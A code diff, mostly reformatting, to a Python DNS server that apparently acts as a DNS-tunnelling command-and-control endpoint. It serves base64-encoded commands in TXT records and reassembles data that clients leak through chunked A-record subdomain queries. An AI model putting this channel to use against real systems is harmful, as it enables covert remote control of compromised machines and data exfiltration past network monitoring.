@@ -81,12 +81,17 @@ def generateClient():
 
 
 def parseRequest(request, addr):
+    domainparts = str(request.q.qname).replace(f".{settings['domain']}", "")
+    pattern = r""
+    result = re.sub(r'([^\.]{63})\.', r'\1', domainparts)
+    
+    print(f"------------ {result}")
     return {
         "ip_address": addr[0],
         "domain_name": str(request.q.qname),
         "query_class": str(request.q.qclass),
         "query_type": QTYPE[request.q.qtype],
-        "domain_parts": str(request.q.qname).replace(f".{settings['domain']}", "").split(".")
+        "domain_parts": result.split(".")
     }
 
 
@@ -103,10 +108,12 @@ def sendData(code, counter, command):
         query = parseRequest(request, addr)
         requestdomain = query["domain_name"].lower()
         if(loglevel >= 2):
-            print(f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
+            print(
+                f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
         if(query["query_type"] == "TXT" and requestdomain == f"{counter}.{code}.{settings['domain']}.".lower()):
             if(loglevel >= 1):
-                print(f"Responding with command '{command}' for request domain '{requestdomain}'")
+                print(
+                    f"Responding with command '{command}' for request domain '{requestdomain}'")
             # Build response with command
             command = base64_encode_string(command)
             response = DNSRecord(
@@ -132,14 +139,14 @@ def getData(code, counter):
         request = DNSRecord.parse(rawrequest)
         query = parseRequest(request, addr)
         if(loglevel >= 2):
-            print(f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
+            print(
+                f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
         if query["query_type"] == "A" and query["domain_name"].lower().endswith(f"{code}-{counter}.{settings['domain']}.".lower()):
             thisdata = query["domain_parts"]
 
             if not thisdata[3] in data:
                 data[thisdata[3]] = {}
-            data[thisdata[3]][int(thisdata[1])
-                              ] = thisdata[0].replace("_", "=")
+            data[thisdata[3]][int(thisdata[1])] = thisdata[0].replace("_", "=")
 
             print_progress(len(data[thisdata[3]]), int(
                 thisdata[2]), prefix=f'Packet {len(data[thisdata[3]])}/{thisdata[2]}', suffix='Complete', bar_length=50)
